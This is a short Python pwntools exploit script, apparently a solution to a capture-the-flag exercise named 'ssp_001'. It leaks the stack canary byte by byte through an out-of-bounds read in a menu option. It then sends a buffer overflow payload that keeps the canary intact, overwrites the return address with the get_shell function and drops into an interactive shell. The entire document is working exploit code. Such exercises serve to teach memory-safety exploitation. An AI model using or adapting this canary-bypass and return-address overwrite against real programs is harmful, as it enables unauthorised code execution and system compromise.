from pwn import *

p = process('./ssp_001')
e= ELF('./ssp_001')


get_shell = e.symbols['get_shell']

context.log_level = 'debug'

canary = b''
# arbitory memory read vuln on "print_box" func
# leak canary (4byte)

for i in range(0x83,0x7f,-1):
    p.sendafter(b'>',b'P')
    p.sendlineafter(b' : ',bytes(str(i),'utf-8'))
    p.recvuntil(' : ')
    canary += p.recv(2)

canary = int(canary,16)

print('canary : 0x%08x'%canary)

payload = b''

payload += b'A'*0x40 # overwrite name[0x40]
payload += p32(canary)
payload += b'B'*4 # dummy
payload += b'C'*4 # ebp

payload += p32(get_shell) # return address overwrite

p.sendafter(b'> ',b'E')

'''
read(int fd, void* buf, size_t count)
-> set count as payload to trigger bof
'''

p.sendlineafter(' : ',bytes(str(len(payload)),'utf-8')) 

p.sendafter(' : ',payload)
p.interactive()